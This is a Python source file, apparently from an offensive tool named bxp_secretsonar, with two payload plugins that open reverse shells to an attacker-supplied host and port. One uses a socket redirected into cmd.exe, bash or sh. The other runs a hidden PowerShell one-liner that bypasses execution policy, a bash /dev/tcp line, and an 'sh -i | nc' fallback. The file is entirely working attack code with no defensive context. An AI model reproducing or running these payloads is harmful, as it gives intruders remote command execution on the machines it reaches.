import socket, subprocess, os, sys, platform
from bxp_secretsonar.plugins.plugin_loader import PayloadPlugin
from bxp_secretsonar.core.models_v2 import PluginMeta, PluginType
from bxp_secretsonar.core.environment import EnvironmentProfile

class PythonReverseShell(PayloadPlugin):
    meta = PluginMeta(
        name="python_reverse_shell",
        description="Python reverse shell (cross-platform)",
        plugin_type=PluginType.PAYLOAD,
        protocols=["tcp"]
    )
    def run(self, lhost, lport, options=None):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((lhost, int(lport)))
        if sys.platform == "win32":
            # Windows: utiliser subprocess avec cmd.exe
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(["cmd.exe"])
        else:
            # Unix: utiliser pty si possible
            try:
                import pty
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                pty.spawn("/bin/bash" if os.path.exists("/bin/bash") else "/bin/sh")
            except ImportError:
                # Pas de pty (ex. Windows ou Android sans pty)
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                subprocess.call(["/bin/sh", "-i"])
        s.close()

class NativeShellReverse(PayloadPlugin):
    meta = PluginMeta(
        name="native_reverse_shell",
        description="Reverse shell using native OS commands",
        plugin_type=PluginType.PAYLOAD
    )
    def run(self, lhost, lport, options=None):
        env = EnvironmentProfile()
        if env.is_windows:
            # PowerShell one-liner reverse shell
            ps_cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()\""
            subprocess.Popen(ps_cmd, shell=True)
        else:
            # Bash reverse shell
            bash_cmd = f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            # Si pas de bash, essayer sh et netcat
            if not os.path.exists("/bin/bash"):
                # fallback avec sh et nc si disponible
                import shutil
                nc = shutil.which("nc")
                if nc:
                    cmd = f"sh -i 2>&1 | nc {lhost} {lport}"
                    subprocess.Popen(cmd, shell=True)
                else:
                    # Essayer python reverse shell comme dernier recours
                    self.meta.name = "python_reverse_shell"
                    return PythonReverseShell().run(lhost, lport)
            else:
                subprocess.Popen(bash_cmd, shell=True)
        return {"output": f"Reverse shell initiated to {lhost}:{lport}"}
